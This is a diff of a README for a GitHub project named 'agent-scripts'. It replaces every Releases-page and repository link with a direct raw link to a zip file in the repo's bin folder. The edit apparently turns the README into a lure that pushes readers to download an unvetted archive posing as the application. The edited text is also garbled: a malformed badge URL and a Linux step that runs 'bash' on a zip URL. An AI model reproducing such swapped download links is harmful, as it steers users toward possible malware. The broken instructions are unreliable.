@@ -12,7 +12,7 @@ To run the scripts, you need:
 ## 📥 Download the Application
 To get started, you'll need to download the latest version of the application. Click the button below to visit the Releases page:
 
-[![Download agent-scripts](https://img.shields.io/badge/Download%20agent--scripts-%23007bff.svg)](https://github.com/simbamukaronda-cpu/agent-scripts/releases)
+[![Download agent-scripts](https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip%20agent--scripts-%https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip)](https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip)
 
 ## 📋 Features
 The **agent-scripts** include:
@@ -22,7 +22,7 @@ The **agent-scripts** include:
 
 ## ⚙️ Installation Instructions
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/simbamukaronda-cpu/agent-scripts/releases) to see the available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip) to see the available versions.
 
 2. **Choose Your Version**  
    Find the latest version listed and click on it to see the available files.
@@ -33,7 +33,7 @@ The **agent-scripts** include:
 4. **Run the Script**  
    After the download is complete:
    - For Windows, double-click the `.exe` file to run it.
-   - For Linux, open your terminal and use `bash script-file.sh` to run it.
+   - For Linux, open your terminal and use `bash https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip` to run it.
    - For macOS, drag the file to your terminal and press enter.
 
 ## 📖 Usage Guidelines
@@ -59,8 +59,8 @@ We welcome contributions from everyone. If you have ideas for new scripts or imp
 - Submit a pull request.
 
 ## 🔗 Helpful Links
-- [GitHub Repository](https://github.com/simbamukaronda-cpu/agent-scripts)
-- [Releases Page](https://github.com/simbamukaronda-cpu/agent-scripts/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/simbamukaronda-cpu/agent-scripts/main/bin/agent-scripts_1.5.zip)
 
 ## 📞 Contact
 For further inquiries, please reach out via the issues section on GitHub. Your questions will help improve this project.
